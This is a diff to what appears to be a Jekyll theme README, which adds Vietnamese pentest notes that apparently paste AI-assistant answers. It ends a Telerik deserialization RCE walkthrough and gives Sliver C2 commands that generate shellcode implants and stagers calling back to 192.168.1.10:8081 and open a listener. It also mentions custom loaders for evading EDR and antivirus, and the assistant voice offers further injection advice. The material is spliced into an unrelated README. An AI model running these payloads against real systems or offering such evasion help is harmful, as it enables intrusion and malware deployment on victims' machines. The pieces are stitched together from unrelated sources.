@@ -565,6 +565,40 @@ Vì đây là môi trường kiểm thử hộp đen từ xa (không có quyền
 	• Sử dụng đồng hồ bấm giờ, nếu thời gian từ lúc bấm Enter gửi payload đến lúc Server trả về kết quả kéo dài đúng hoặc hơn 15 giây (Bằng với thời gian Thread.Sleep(15000) cài đặt trong DLL), thì đây là bằng chứng không thể chối cãi cho thấy mã lệnh của bạn đã được CPU của Server thực thi trực tiếp thông qua lỗ hổng Deserialization.
 	• Phản hồi trả về thường là mã lỗi HTTP 500 (Internal Server Error) đi kèm với thông báo lỗi ép kiểu (do sau khi chạy hàm Install xong, luồng Deserialization thông thường của Telerik bị gián đoạn và crash). Đây là phản hồi thành công đối với một cuộc thử nghiệm RCE.
 Hãy tiến hành biên dịch tệp DLL theo các bước trên. Trong quá trình chạy script Python để dò tìm khóa ở Bước 2, nếu bạn gặp lỗi kết nối hoặc thời gian phản hồi (Timeout) từ phía mục tiêu, hãy gửi thông tin lỗi đó tại đây để tôi hỗ trợ bạn tùy chỉnh cấu hình HTTP Request (User-Agent, Proxy, Chặn WAF) cho phù hợp.
+////////////////////////////////////////////////////////////////////////////////////////////////
+Dưới đây là câu trả lời trực tiếp cho các câu hỏi của bạn về cấu hình payload và listener trên framework Sliver C2: [1] (https://github.com/bishopfox/sliver)
 
+1. Sliver có hỗ trợ gen implant shellcode hay không?
+
+Có. Sliver hỗ trợ đầy đủ việc xuất payload dưới dạng shellcode (cho cả hai chế độ session và beacon). [1] (https://github.com/bishopfox/sliver), [2] (https://radiantsec.io/docs/tools/sliver/)
+Bạn chỉ cần thêm tham số --format shellcode vào câu lệnh khởi tạo. Ví dụ: [1] (https://github.com/BishopFox/sliver/issues/2193), [2] (https://radiantsec.io/docs/tools/sliver/)
+bash
+sliver > generate --http 192.168.1.10:8081 --format shellcode --save /path/to/output.bin
+Hãy thận trọng khi sử dụng mã.
+(Định dạng shellcode này rất hữu ích khi bạn muốn tự viết mã tải tùy chỉnh - Custom Loader - bằng C/C++, C#, hoặc PowerShell để tiêm trực tiếp vào bộ nhớ của một tiến trình hợp lệ nhằm né tránh EDR/Antivirus). [1] (https://community.netwitness.com/s/article/689643), [2] (https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/)
+
+2. Có thể custom port server listeners thành 8081 không?
+
+Có, hoàn toàn được. Mặc định lệnh http sẽ lắng nghe trên port 80. Để đổi sang port 8081, bạn sử dụng tham số --lport (Local Port) khi bật listener: [1] (https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2/04eed2ffc16ad6176e09c13ac65893fdfbad1073), [2] (https://radiantsec.io/docs/tools/sliver/)
+bash
+sliver > http --lport 8081
+Hãy thận trọng khi sử dụng mã.
+Lưu ý: Khi tạo implant shellcode ở câu lệnh phía trên, bạn bắt buộc phải chỉ định đúng port này trong địa chỉ kết nối (192.168.1.10:8081). [1] (https://radiantsec.io/docs/tools/sliver/)
+
+3. Kích thước (size) của shellcode là bao nhiêu?
+
+Kích thước của shellcode trong Sliver phụ thuộc hoàn toàn vào việc bạn chọn tạo payload Stageless (Đầy đủ) hay Staged (Dùng trình tải giai đoạn): [1] (https://github.com/BishopFox/sliver/wiki/Stagers/af217a1df63ea4abb92cbd1d5b66488ce9856652), [2] (https://radiantsec.io/docs/tools/sliver/)
+• Stageless Shellcode (Mặc định khi dùng lệnh generate): Dung lượng rất lớn, dao động từ 10 MB đến 15 MB. Do Sliver được viết bằng Go, khi chuyển đổi toàn bộ file thực thi tính năng cao này thành shellcode dạng thô, kích thước của nó không hề giảm đi so với file .exe gốc. [1] (https://www.immersivelabs.com/resources/c7-blog/detecting-and-decrypting-sliver-c2-a-threat-hunters-guide)
+• Staged Shellcode (Chỉ chứa mã tải giai đoạn đầu): Dung lượng cực kỳ nhỏ, chỉ khoảng vài KB. Bạn có thể tạo loại shellcode siêu nhẹ này bằng lệnh generate stager:bash
+sliver > generate stager --lhost 192.168.1.10 --lport 8081 --protocol http --format shellcode
+Hãy thận trọng khi sử dụng mã.
+Khi thực thi trên máy nạn nhân, đoạn shellcode vài KB này sẽ gửi một truy cập HTTP (thường có phần mở rộng dạng .woff) về listener để kéo nốt cục payload chính (Stage 2) nặng ~7-10 MB vào thẳng RAM. [1] (https://github.com/BishopFox/sliver/wiki/Stagers/7116c1c26c5d4e783d60e4e622bd98c67b13f740), [2] (https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/), [3] (https://github.com/BishopFox/sliver/wiki/Stagers/af217a1df63ea4abb92cbd1d5b66488ce9856652), [4] (https://www.blackdragon.se/index.php/articles/177-sliver-c2-stager-shellcode-and-runners)
+Nếu bạn đang lên kế hoạch triển khai, cho tôi biết:
+• Bạn định sử dụng kỹ thuật injection/loader nào (ví dụ: NtMapViewOfSection, QueueUserAPC, hay một script PowerShell đơn giản)?
+• Môi trường thử nghiệm của bạn có sử dụng Web Application Firewall (WAF) hoặc EDR nào chặn các file dung lượng lớn không?
+Tôi có thể tư vấn thêm cách cấu hình Stager Profile để tối ưu hóa đường truyền!
+/////////////////////////////////////////////////////////////////////////////////////
+https://drive.google.com/drive/folders/1K4P33VKVUd9BAsJy9siZv6VgxrIQo4Js?usp=sharing  : HTB pentestration
+https://drive.google.com/drive/folders/1WQtIH4LCJSC0K42f2QmMum9fAE-czvkh?usp=sharing : HTB Active Directory
 I'd also like to thank [Dr. Jekyll's Themes](https://drjekyllthemes.github.io/), [Jekyll Themes](http://jekyllthemes.org/), and another [Jekyll Themes](http://jekyllrc.github.io/jekyllthemes/) for featuring Beautiful Jekyll in their Jekyll theme directories.
 
